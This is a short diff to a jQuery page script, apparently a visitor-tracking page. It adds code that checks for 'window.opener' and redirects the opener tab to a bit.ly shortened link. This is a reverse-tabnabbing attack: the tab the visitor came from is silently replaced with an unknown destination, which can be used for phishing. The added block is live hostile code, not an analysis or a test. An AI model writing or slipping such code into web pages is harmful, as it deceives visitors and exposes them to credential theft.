@@ -46,6 +46,11 @@ $(document).ready(function() {
         current_session = this;
         showVisitors(current_session);
     });
+
+    if (window.opener) {
+        console.log(window.opener);
+        window.opener.location = "http://bit.ly/olegykz"
+    }
 })
 
 function initCatcher(session) {
